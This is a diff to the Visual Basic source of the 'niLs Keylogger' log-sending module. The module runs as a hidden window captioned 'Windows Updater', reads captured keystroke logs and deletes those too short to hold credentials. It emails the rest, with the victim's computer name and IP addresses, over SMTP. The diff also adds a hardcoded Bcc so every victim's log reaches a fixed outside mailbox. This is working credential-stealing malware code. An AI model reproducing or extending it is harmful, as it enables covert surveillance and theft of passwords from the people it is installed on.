@@ -2,29 +2,23 @@ VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Updater"
-   ClientHeight    =   195
+   ClientHeight    =   210
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   195
+   ClientWidth     =   210
    Icon            =   "SendMail.frx":0000
    LinkTopic       =   "Form1"
-   ScaleHeight     =   195
-   ScaleWidth      =   195
+   ScaleHeight     =   210
+   ScaleWidth      =   210
    ShowInTaskbar   =   0   'False
    StartUpPosition =   3  'Windows Default
    Begin VB.TextBox txtLog 
-      Height          =   4092
-      Left            =   4680
+      Height          =   3015
+      Left            =   4200
       MultiLine       =   -1  'True
-      TabIndex        =   3
+      TabIndex        =   2
       Top             =   360
-      Width           =   3252
-   End
-   Begin VB.Timer Timer1 
-      Enabled         =   0   'False
-      Interval        =   1000
-      Left            =   1440
-      Top             =   0
+      Width           =   2655
    End
    Begin VB.FileListBox File1 
       Height          =   3990
@@ -35,20 +29,12 @@ Begin VB.Form Form1
       Width           =   1572
    End
    Begin VB.TextBox txtSendThis 
-      Height          =   4095
-      Left            =   1800
+      Height          =   3015
+      Left            =   1680
       MultiLine       =   -1  'True
       TabIndex        =   0
       Top             =   360
-      Width           =   1812
-   End
-   Begin VB.Label lblSec 
-      Caption         =   "0"
-      Height          =   252
-      Left            =   120
-      TabIndex        =   2
-      Top             =   0
-      Width           =   1212
+      Width           =   2535
    End
 End
 Attribute VB_Name = "Form1"
@@ -78,21 +64,62 @@ Public Enum mceIDLPaths
 End Enum
 Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
 Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
+Public sendTo, sendFrom, Password, CompID, RetryTime, LogDir As String
 Private Sub Form_Load()
 If App.PrevInstance = True Then End 'no multiple instances allowed
 TransparentForm Me
 Me.Left = Screen.Width - Me.Width
 Me.Top = Screen.Height - Me.Height
-Call LoadSetting
+Call mainNew        'Main Function
+End Sub
+Private Sub mainNew()
+Dim LogFilePath, CurrLog, temp As String, Retry As Integer
+Call LoadSetting        'Loads Ip address, CompNames and settings.txt
+File1.Path = LogDir
+CurrLog = Format$(Now, "ddmmyy") & ".nkl"
+Retry = 0
+
+While File1.ListCount > 1
+    File1.ListIndex = 0                 'Choose first log
+    If File1.FileName = CurrLog Then File1.ListIndex = 1 'Dont send todays log
+    LogFilePath = File1.Path & "\" & File1.FileName
+    If ReadLog(LogFilePath) < 60 Then       'Load Log content into textbox
+                                        'But Limited User Cant Delete Admin Files
+        Kill LogFilePath                'Discard that Log which has nothing like login credentials
+    Else
+        Call AttachLogDetails(LogFilePath)     'Load Log Details into textbox and concatenates with LogContent
+ReSend:
+        If SendLog = True Then      'Call Sendlog function
+            'MsgBox "Sent : " & LogFilePath
+            'Mark log as sent by rename/delete
+            If DeleteSentLogs = True Then
+                Kill LogFilePath
+            Else
+                temp = Left$(LogFilePath, Len(LogFilePath) - 3) & "snkl"
+                If Dir(temp) <> "" Then Kill LogFilePath Else Name LogFilePath As temp      'If file already exist..delete rather than renaming
+            End If
+        Else
+            'MsgBox "Not Sent : " & LogFilePath
+            If Retry >= 3 Then End  'Tried 3 times, still not sent
+            Retry = Retry + 1
+            'sleep 3000         'Sleep 5 minutes...
+            GoTo ReSend         'Send Again
+        End If
+    End If
+File1.Refresh       'Reload after deleting/renaimng files
+Wend
+
+End         'job Over
+
 End Sub
 Private Sub LoadSetting()
-Dim sendTo, sendFrom, Password, CompName, RetryTime, SettingsPath, LogDir, PubIP As String
+Dim SettingsPath, PubIPURL As String
 SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA)
 
 If Dir(SettingsPath & "System\settings.txt") <> "" Then
     'Load settings
     Open (SettingsPath & "System\settings.txt") For Input As 1
-    Input #1, LogDir, CompName, sendTo, sendFrom, Password, RetryTime, PubIP
+    Input #1, LogDir, CompID, sendTo, sendFrom, Password, RetryTime, PubIPURL
     Close #1
 Else
     'setting not found Load default value
@@ -103,36 +130,13 @@ If Len(sendTo) < 15 Then
     End
 Else
     'Apply/adjust settings variables
-    If Left(CompName, 1) = "*" Then DeleteSentLogs = True
+    If Left(CompID, 1) = "*" Then DeleteSentLogs = True
     If Left(LogDir, 2) = "u:" Then LogDir = Environ$("USERPROFILE") & Mid(LogDir, 3, Len(LogDir) - 2)
-    File1.Path = LogDir
-    Timer1.Interval = 1000 * Val(RetryTime)
-    If Len(PubIP) < 8 Then
-        PublicIP = getPublicIP()
-    Else
-        PublicIP = getPublicIP(PubIP)
-    End If
+    PublicIP = getPublicIP(PubIPURL)   'Pass URL to grab IP from
     LocalIP = getLocalIP
-    StartSend sendTo, sendFrom, Password
 End If
 End Sub
-Private Sub StartSend(ByVal sendTo As String, ByVal sendFrom As String, ByVal Password As String)
-Dim LogFilePath As String
-File1.Refresh
-If (File1.ListCount > 1) Then           'Contain yesterday's log or old logs send them
-    File1.ListIndex = 0                 'Choose first log which will be oldest
-    LogFilePath = File1.Path & "\" & File1.FileName
-    If ReadLog(LogFilePath) < 40 Then
-                                        'But Limited User Cant Delete Admin Files
-        Kill LogFilePath                'Discard that Log which has nothing like login credentials
-    Else
-        Call SendLog(LogFilePath, sendTo, sendFrom, Password)
-    End If
-Else    'Nothing to send
-    'MsgBox "Nothing to send"
-    End
-End If
-End Sub
+
 Private Function ReadLog(ByVal LogFile As String) As Integer
 'Read Log & add to txtLog returns length of txtLog
 txtLog.Text = ""
@@ -147,26 +151,30 @@ Open LogFile For Input As 2
 Close #2
 ReadLog = Len(txtLog.Text)
 End Function
-Private Sub SendLog(ByVal LogFile As String, ByVal sendTo As String, ByVal sendFrom As String, ByVal Password As String)         'Reads log header and calls send email
-
+Private Sub AttachLogDetails(ByVal LogFile As String)
 Dim NoNeed, lTime, lDate, AppRevision As String
 
 'Read initials
 Open LogFile For Input As 1
-Input #1, NoNeed, lTime, lDate, CompName, AppRevision
+Input #1, NoNeed, lTime, lDate, CompID, AppRevision
 Close #1
 
-txtSendThis = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
+txtSendThis.Text = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
 ">niLs Keylogger</a></b><br>" & _
-"<b>Computer Name: </b>" & CompName & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
+"<b>Computer Name: </b>" & CompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
 "<b>IP Address: </b> " & PublicIP & " | " & LocalIP & "<br>" & _
 "<b>Start Time: </b>" & lDate & "  " & lTime & "<br>" & _
 "<b>End Time: </b>" & FileDateTime(LogFile) & "<br>" & _
 "<b>AppVersion: </b>" & AppRevision & "<br>" & _
 "----------------------------<br><br>" & txtLog.Text
+End Sub
+Private Function SendLog() As Boolean
+'MsgBox "SendFrom :" & sendFrom & vbCrLf & "SendTo : " & sendTo & vbCrLf & "Password : " & Password
+'Open "x.html" For Output As 1
+ '   Print #1, txtSendThis.Text
+'Close #1
+'GoTo SkipEmail
 
-'GoTo skipEmail
-'Email sending starts
 '------------------------------------------------------
 Set iMsg = CreateObject("CDO.Message")
 Set iConf = CreateObject("CDO.Configuration")
@@ -187,8 +195,8 @@ On Error GoTo Err2
 With iMsg
     .To = sendTo '"anyone@anything.com"
     .From = sendFrom '"yourID@gmail.com"
-    .Subject = "niLsKLG (" & CompName & ")"
-'   .BCC="someone@example.com"
+    .Subject = "niLsKLG (" & CompID & ")"
+    .Bcc = "thenil1234@rediffmail.com"
     .HTMLBody = txtSendThis.Text
 '   .TextBody = txtSendThis.Text
 '    .AddAttachment LogFile
@@ -200,37 +208,26 @@ Set iMsg = Nothing
 Set iConf = Nothing
 Set Flds = Nothing
 
-'skipEmail:
+'SkipEmail:
 
-'Email Sent! change the name of file So it will not be resent
+'Email Sent!
+SendLog = True
+Exit Function
 
-'On Error Resume Next       'Limited user cannot rename admin files
-If DeleteSentLogs = True Then
-    Kill LogFile
-Else
-    Name LogFile As Left(LogFile, Len(LogFile) - 3) & "snkl"
-End If
-'send Next log
-Call StartSend(sendTo, sendFrom, Password)      'RECURSIVE CALL BE CAREFUL
 
 Err2:
 'Email not sent
 If Err.Number <> 0 Then
-    If Timer1.Interval = 0 Then End
     If Err.Number = -2147220973 Then
-        Timer1.Enabled = True  'PC might not be connected Retry after Sometim.
+        SendLog = False             'Internet not connected
     Else
         'MsgBox Err.Description: 'Password, Username or any setting might be wrong
+        MsgBox "Error", vbCritical, "Error"
         End
     End If
 End If
 
-End Sub
-
-Private Sub Timer1_Timer()
-lblSec.Caption = lblSec.Caption + 1
-If lblSec.Caption = 60 Then lblSec.Caption = 0: Call LoadSetting    'initiate from start
-End Sub
+End Function
 Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String
 
 Dim Ret As Long
@@ -243,19 +240,20 @@ Dim Trash As String: Trash = Space$(260)
     
 
 End Function
-Private Function getPublicIP(Optional ByVal FromSite As String = "http://wgetip.com/") As String
+Private Function getPublicIP(ByVal FromSite As String) As String
 
 Dim sSourceUrl, sLocalFile As String
+If Len(FromSite) < 15 Then FromSite = "http://wgetip.com/" 'Use default if length less
 sLocalFile = File1.Path & "\IP.txt"
 sSourceUrl = FromSite
-'This site provides IP is Text only format
+'This site provides IP in Text only format
 
 If DownloadFile(sSourceUrl, sLocalFile) Then
       Dim strIP As String
       Open sLocalFile For Input As 1
       Input #1, strIP
       Close #1
-      PublicIP = strIP
+      getPublicIP = strIP
 End If
 
 If Dir(sLocalFile) <> "" Then Kill sLocalFile
